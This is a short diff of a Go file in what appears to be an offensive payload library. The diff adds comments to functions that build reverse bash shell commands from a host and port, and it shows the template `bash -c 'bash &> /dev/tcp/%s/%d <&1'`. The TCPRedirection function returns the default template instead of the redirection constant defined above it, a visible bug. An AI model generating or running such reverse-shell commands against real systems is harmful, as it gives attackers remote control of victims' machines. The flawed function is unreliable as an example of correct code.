+++ payload/reverse/bash.go
@@ -9,10 +9,12 @@ const (
 	BashTCPRedirection = `bash -c 'bash &> /dev/tcp/%s/%d <&1'`
 )
 
+// The default payload type for reverse bash utilizes the pseudo-dev networking redirects in default bash
 func (bash *BashPayload) Default(lhost string, lport int) string {
 	return fmt.Sprintf(BashDefault, lhost, lport)
 }
 
+// Utilizes the bash networking pseudo `/dev/tcp/` functionality to create a reverse bash shell.
 func (bash *BashPayload) TCPRedirection(lhost string, lport int) string {
 	return fmt.Sprintf(BashDefault, lhost, lport)
 }
